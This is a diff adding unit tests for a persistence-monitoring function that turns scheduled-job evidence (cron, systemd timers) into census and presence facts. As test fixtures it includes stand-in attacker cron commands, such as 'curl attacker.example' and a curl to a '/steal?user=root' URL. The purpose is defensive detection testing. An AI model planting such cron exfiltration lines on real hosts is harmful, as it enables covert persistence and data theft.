@@ -6,12 +6,17 @@ import {
   PROCESS_LINEAGE_EDGE_CENSUS_FACT_NAME,
   PROCESS_LINEAGE_EDGE_CENSUS_MARKER_ENTITY_KEY,
   PROCESS_LINEAGE_EDGE_FACT_NAME,
+  SCHEDULED_JOB_CENSUS_FACT_NAME,
+  SCHEDULED_JOB_CENSUS_MARKER_ENTITY_KEY,
+  SCHEDULED_JOB_PRESENCE_FACT_NAME,
   SERVICE_CENSUS_FACT_NAME,
   SERVICE_CENSUS_MARKER_ENTITY_KEY,
   SESSION_CENSUS_MARKER_ENTITY_KEY,
+  buildScheduledJobEntityKey,
   factPointsFromNetworkEvidence,
   factPointsFromCanaryEvidence,
   factPointsFromProcessLineageEvidence,
+  factPointsFromScheduledJobsEvidence,
   factPointsFromServiceEvidence,
   factPointsFromSessionEvidence,
   factPointsFromTailscaleStatusEvidence,
@@ -108,6 +113,153 @@ test("factPointsFromProcessLineageEvidence marks truncated ticks partial and omi
   assert.deepEqual(factPointsFromProcessLineageEvidence([
     envelope("process-lineage-edges", "collect_process_lineage", { edges: [] }, "unable"),
   ], { ts: TS }), []);
+});
+
+// --- factPointsFromScheduledJobsEvidence (Persistence baseline, Slice A) ---
+
+function scheduledJobsEnvelope(result, status = "ok") {
+  return envelope("scheduled-jobs", "collect_scheduled_jobs", result, status);
+}
+
+function cronJob({ path = "/etc/cron.d/a", schedule = "* * * * *", user = "root", command = "echo hi", lineNumber = 1 } = {}) {
+  return { kind: "cron", source: "cron_d", path, line_number: lineNumber, schedule, user, command };
+}
+
+test("factPointsFromScheduledJobsEvidence returns [] for a missing envelope and for status:'unable'", () => {
+  assert.deepEqual(factPointsFromScheduledJobsEvidence([], { ts: TS }), []);
+  assert.deepEqual(factPointsFromScheduledJobsEvidence([
+    scheduledJobsEnvelope({ jobs: [], summary: { unavailable_count: 1 }, truncated: false }, "unable"),
+  ], { ts: TS }), []);
+});
+
+test("factPointsFromScheduledJobsEvidence emits one presence fact per job plus exactly one complete census marker on a clean ok tick", () => {
+  const points = factPointsFromScheduledJobsEvidence([
+    scheduledJobsEnvelope({
+      jobs: [cronJob(), { kind: "systemd_timer", source: "systemd_timers", unit: "backup.timer" }],
+      summary: { unavailable_count: 0 },
+      truncated: false,
+    }),
+  ], { ts: TS });
+
+  const markers = points.filter((p) => p.fact_name === SCHEDULED_JOB_CENSUS_FACT_NAME);
+  assert.equal(markers.length, 1);
+  assert.equal(markers[0].entity_key, SCHEDULED_JOB_CENSUS_MARKER_ENTITY_KEY);
+  assert.equal(markers[0].attributes.census_state, "complete");
+  assert.equal(markers[0].confidence, 0);
+
+  const presence = points.filter((p) => p.fact_name === SCHEDULED_JOB_PRESENCE_FACT_NAME);
+  assert.equal(presence.length, 2);
+  assert.equal(new Set(presence.map((p) => p.entity_key)).size, 2, "distinct jobs must produce distinct entity keys");
+});
+
+test("factPointsFromScheduledJobsEvidence: a genuinely zero-job ok tick still emits a complete census marker and zero presence facts", () => {
+  const points = factPointsFromScheduledJobsEvidence([
+    scheduledJobsEnvelope({ jobs: [], summary: { unavailable_count: 0 }, truncated: false }),
+  ], { ts: TS });
+  assert.equal(points.length, 1);
+  assert.equal(points[0].fact_name, SCHEDULED_JOB_CENSUS_FACT_NAME);
+  assert.equal(points[0].attributes.census_state, "complete");
+});
+
+test("[REVIEW must-fix] census_state is 'partial' when unavailable_count > 0, even if total_count === returned_count", () => {
+  const points = factPointsFromScheduledJobsEvidence([
+    scheduledJobsEnvelope({ jobs: [], summary: { unavailable_count: 1 }, truncated: false }, "warning"),
+  ], { ts: TS });
+  assert.equal(points[0].attributes.census_state, "partial");
+});
+
+test("[REVIEW must-fix] census_state is 'partial' when the fairness-cap truncated the returned set, even with unavailable_count === 0", () => {
+  const points = factPointsFromScheduledJobsEvidence([
+    scheduledJobsEnvelope({ jobs: [cronJob()], summary: { unavailable_count: 0 }, truncated: true }),
+  ], { ts: TS });
+  assert.equal(points.find((p) => p.fact_name === SCHEDULED_JOB_CENSUS_FACT_NAME).attributes.census_state, "partial");
+});
+
+test("[REVIEW must-fix, P2 probe-truncation trap] census_state is 'partial' when a probe reported truncated:true even though total_count === returned_count AND unavailable_count === 0 (the naive formula's 'complete' case)", () => {
+  // This mirrors the real collector's envelope.truncated derivation
+  // (allJobs.length > jobs.length || probes.some(p => p.truncated)) — the probe-level leg can trip
+  // even when the total-vs-returned counts alone look clean, because the drop happens BEFORE
+  // allJobs is ever assembled (a capped directory listing, a capped launchd candidate list, a
+  // byte-capped cron file read).
+  const points = factPointsFromScheduledJobsEvidence([
+    scheduledJobsEnvelope({
+      jobs: [cronJob()],
+      summary: { total_count: 1, returned_count: 1, unavailable_count: 0 },
+      truncated: true,
+    }),
+  ], { ts: TS });
+  assert.equal(points.find((p) => p.fact_name === SCHEDULED_JOB_CENSUS_FACT_NAME).attributes.census_state, "partial");
+});
+
+test("census marker defaults to 'complete' when result.summary is absent (legacy/simplified evidence shape), matching the real collector's own zero-unavailable/non-truncated tick", () => {
+  const points = factPointsFromScheduledJobsEvidence([
+    scheduledJobsEnvelope({ jobs: [] }),
+  ], { ts: TS });
+  assert.equal(points[0].attributes.census_state, "complete");
+});
+
+test("factPointsFromScheduledJobsEvidence emits NO census marker on an 'unknown' (unsupported-platform) envelope", () => {
+  const points = factPointsFromScheduledJobsEvidence([
+    scheduledJobsEnvelope({ jobs: [], summary: { unavailable_count: 0 }, truncated: false }, "unknown"),
+  ], { ts: TS });
+  assert.deepEqual(points, []);
+});
+
+test("[REVIEW must-fix] cron entity-key: two distinct entries in one crontab file (same path, different schedule/command) produce two DIFFERENT entity keys", () => {
+  const jobA = cronJob({ schedule: "0 * * * *", command: "echo a", lineNumber: 1 });
+  const jobB = cronJob({ schedule: "0 0 * * *", command: "echo b", lineNumber: 2 });
+  const points = factPointsFromScheduledJobsEvidence([
+    scheduledJobsEnvelope({ jobs: [jobA, jobB], summary: { unavailable_count: 0 }, truncated: false }),
+  ], { ts: TS });
+  const keys = points.filter((p) => p.fact_name === SCHEDULED_JOB_PRESENCE_FACT_NAME).map((p) => p.entity_key);
+  assert.equal(new Set(keys).size, 2, "two structurally distinct cron lines sharing one file path must not collapse to one entity key");
+});
+
+test("[REVIEW must-fix] cron entity-key: a new line appended to an already-established crontab produces a NEW entity key distinct from the existing line's — the regression proving Slice B can later fire on it", () => {
+  const existingLine = cronJob({ schedule: "0 * * * *", command: "echo existing", lineNumber: 1 });
+  const newLine = cronJob({ schedule: "*/5 * * * *", command: "curl attacker.example", lineNumber: 2 });
+  const before = factPointsFromScheduledJobsEvidence([
+    scheduledJobsEnvelope({ jobs: [existingLine], summary: { unavailable_count: 0 }, truncated: false }),
+  ], { ts: TS });
+  const after = factPointsFromScheduledJobsEvidence([
+    scheduledJobsEnvelope({ jobs: [existingLine, newLine], summary: { unavailable_count: 0 }, truncated: false }),
+  ], { ts: TS });
+  const beforeKeys = new Set(before.filter((p) => p.fact_name === SCHEDULED_JOB_PRESENCE_FACT_NAME).map((p) => p.entity_key));
+  const afterKeys = after.filter((p) => p.fact_name === SCHEDULED_JOB_PRESENCE_FACT_NAME).map((p) => p.entity_key);
+  const newKeys = afterKeys.filter((key) => !beforeKeys.has(key));
+  assert.equal(newKeys.length, 1, "exactly one genuinely new entity key must appear once the new line is added");
+});
+
+test("[REVIEW must-fix] cron entity-key: pure reordering of the same entries (identical content, different line_number) yields an IDENTICAL set of entity keys — no spurious appear/disappear", () => {
+  const jobA = cronJob({ schedule: "0 * * * *", command: "echo a" });
+  const jobB = cronJob({ schedule: "0 0 * * *", command: "echo b" });
+  const originalOrder = factPointsFromScheduledJobsEvidence([
+    scheduledJobsEnvelope({ jobs: [{ ...jobA, line_number: 1 }, { ...jobB, line_number: 2 }], summary: { unavailable_count: 0 }, truncated: false }),
+  ], { ts: TS });
+  const reordered = factPointsFromScheduledJobsEvidence([
+    scheduledJobsEnvelope({ jobs: [{ ...jobB, line_number: 1 }, { ...jobA, line_number: 2 }], summary: { unavailable_count: 0 }, truncated: false }),
+  ], { ts: TS });
+  const keysOf = (points) => new Set(points.filter((p) => p.fact_name === SCHEDULED_JOB_PRESENCE_FACT_NAME).map((p) => p.entity_key));
+  assert.deepEqual(keysOf(originalOrder), keysOf(reordered));
+});
+
+test("composite-key collision negative test: (cron, /etc/cron.d/a, identity 'b->c') and (cron, /etc/cron.d/a->b, identity 'c') produce DIFFERENT entity keys (length-prefix framing)", () => {
+  const keyOne = buildScheduledJobEntityKey("cron", "/etc/cron.d/a", "b->c");
+  const keyTwo = buildScheduledJobEntityKey("cron", "/etc/cron.d/a->b", "c");
+  assert.notEqual(keyOne, keyTwo);
+});
+
+test("hash-at-source: a cron command shaped like an IP/hostname/username does not survive verbatim into entity_key or attributes — only kind/source (closed-enum) and a fixed-length digest do", () => {
+  const rawCommand = "curl http://198.51.100.7/steal?user=root&host=corp-laptop.internal";
+  const job = cronJob({ command: rawCommand });
+  const points = factPointsFromScheduledJobsEvidence([
+    scheduledJobsEnvelope({ jobs: [job], summary: { unavailable_count: 0 }, truncated: false }),
+  ], { ts: TS });
+  assert.equal(JSON.stringify(points).includes(rawCommand), false);
+  assert.equal(JSON.stringify(points).includes("198.51.100.7"), false);
+  assert.equal(JSON.stringify(points).includes("corp-laptop"), false);
+  const presence = points.find((p) => p.fact_name === SCHEDULED_JOB_PRESENCE_FACT_NAME);
+  assert.match(presence.entity_key, /^scheduled_job\./);
 });
 
 // --- factPointsFromServiceEvidence ---
